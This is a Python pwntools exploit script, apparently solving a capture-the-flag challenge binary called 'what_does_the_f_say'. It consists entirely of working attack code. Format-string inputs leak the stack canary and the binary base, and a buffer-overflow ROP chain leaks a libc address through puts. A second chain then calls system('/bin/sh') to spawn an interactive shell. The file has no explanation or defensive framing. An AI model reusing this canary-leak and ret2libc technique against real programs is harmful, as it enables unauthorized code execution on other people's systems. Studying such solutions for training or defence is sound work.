#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./what_does_the_f_say")

offset = 24
junk = b"A" * offset

shell.sendlineafter(b"Space food\n", b"1")
shell.sendlineafter(b"(70.00 s.rocks)\n", b"2")
shell.sendlineafter(b"Kryptonite?\n", b"%13$p")

canary = int(shell.recvline().strip(), 16)

shell.sendlineafter(b"Space food\n", b"1")
shell.sendlineafter(b"(70.00 s.rocks)\n", b"2")
shell.sendlineafter(b"Kryptonite?\n", b"%15$p")

binary_base = int(shell.recvline().strip(), 16) - 0x174a

for i in range(6):
    shell.sendlineafter(b"Space food\n", b"2")
    shell.sendlineafter(b"(7.90 s.rocks)", b"3")

payload  = b""
payload += junk
payload += p64(canary)
payload += b"B" * 8                  # rbp value
payload += p64(binary_base + 0x18bb) # pop rdi; ret;
payload += p64(binary_base + 0x3f90) # puts@got
payload += p64(binary_base + 0x1030) # puts@plt
payload += p64(binary_base + 0x155d) # driks_menu()

shell.sendlineafter(b"Space food\n", b"1")
shell.sendlineafter(b"(70.00 s.rocks)\n", b"2")
shell.sendlineafter(b"Kryptonite?\n", b"Red")
shell.sendlineafter(b"buy it?\n", payload)

libc_base = u64(shell.recv(6).ljust(8, b"\x00")) - 0x80a30

payload  = b""
payload += junk
payload += p64(canary)
payload += b"B" * 8                  # rbp value
payload += p64(libc_base + 0x0968ba) # pop rdi; ret;
payload += p64(libc_base + 0x1b40fa) # "/bin/sh"
payload += p64(libc_base + 0x0c7c5a) # ret;
payload += p64(libc_base + 0x04f4e0) # system()

shell.sendlineafter(b"(70.00 s.rocks)\n", b"2")
shell.sendlineafter(b"Kryptonite?\n", b"Red")
shell.sendlineafter(b"buy it?\n", payload)

shell.interactive()
